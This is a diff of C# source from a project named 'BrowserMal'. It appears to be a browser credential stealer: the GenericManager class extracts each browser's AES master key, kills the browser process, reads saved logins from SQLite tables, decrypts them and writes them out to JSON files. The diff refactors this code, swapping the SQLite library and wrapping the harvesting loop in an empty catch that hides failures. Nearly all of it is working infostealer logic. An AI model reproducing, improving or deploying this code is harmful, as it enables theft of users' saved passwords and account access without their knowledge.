@@ -2,17 +2,16 @@
 using BrowserMal.Browser;
 using BrowserMal.Filesaver;
 using BrowserMal.Util;
-using SqliteReader;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using BrowserMal.SQLite;
 
 namespace BrowserMal.Manager
 {
     public class GenericManager<T>
     {
-        //private static Dictionary<string, List<T>> genericList;
         private readonly string tableName;
         private readonly string[] columnNames;
         private readonly bool lastArgEncrypted;
@@ -26,26 +25,30 @@ namespace BrowserMal.Manager
 
         public void Init(ref List<BrowserModel> browsers, string profileType)
         {
-            foreach (BrowserModel browser in browsers)
+            try
             {
-                if (!Directory.Exists(browser.Location))
-                    continue;
+                foreach (BrowserModel browser in browsers)
+                {
+                    if (!Directory.Exists(browser.Location))
+                        continue;
 
-                byte[] key = AesGcm256.GetMasterKey(browser.Location);
+                    byte[] key = AesGcm256.GetMasterKey(browser.Location);
 
-                if (key == null)
-                    continue;
+                    if (key == null)
+                        continue;
 
-                browser.MasterKey = key;
-                ProcessUtil.KillProcess(browser.ProcessName);
+                    browser.MasterKey = key;
+                    ProcessUtil.KillProcess(browser.ProcessName);
 
-                List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);
+                    List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);
 
-                if (result.Count == 0)
-                    continue;
+                    if (result.Count == 0)
+                        continue;
 
-                FileManager.Save<T>(result, $"{browser.Name}_{tableName}.json");
+                    FileManager.Save<T>(result, $"{browser.Name}_{tableName}.json");
+                }
             }
+            catch { }
         }
 
         private List<T> GetLogins(string path, byte[] masterKey, string profileType)
@@ -70,7 +73,7 @@ namespace BrowserMal.Manager
         {
             List<T> generic = new List<T>();
 
-            SqLiteHandler sqLiteHandler = new SqLiteHandler(path);
+            SqliteHandler sqLiteHandler = new SqliteHandler(path);
             sqLiteHandler.ReadTable(tableName);
 
             for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
@@ -92,7 +95,7 @@ namespace BrowserMal.Manager
             return generic;
         }
 
-        private string[] GrabSqliteValues(string[] columns, ref SqLiteHandler sqLiteHandler, int row, byte[] masterKey)
+        private string[] GrabSqliteValues(string[] columns, ref SqliteHandler sqLiteHandler, int row, byte[] masterKey)
         {
             string[] values = new string[columns.Length];
 
